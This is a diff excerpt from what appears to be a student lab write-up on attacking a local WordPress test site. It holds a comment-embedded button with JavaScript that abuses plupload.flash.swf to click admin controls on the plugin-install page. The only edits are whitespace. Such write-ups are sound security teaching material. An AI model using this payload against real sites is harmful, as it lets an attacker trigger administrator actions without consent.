@@ -37,9 +37,9 @@ Time spent: 26 hours spent in total
     `<button onclick="fire()">Click</button>`  
     `<script>`        
        `function fire() {
-       open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'",2000)');`
+       open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'",2000)');`  
        `setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
-       }`
+       }`  
        `</script>`
   - Post the comment as admin
   - A button will appear as a comment
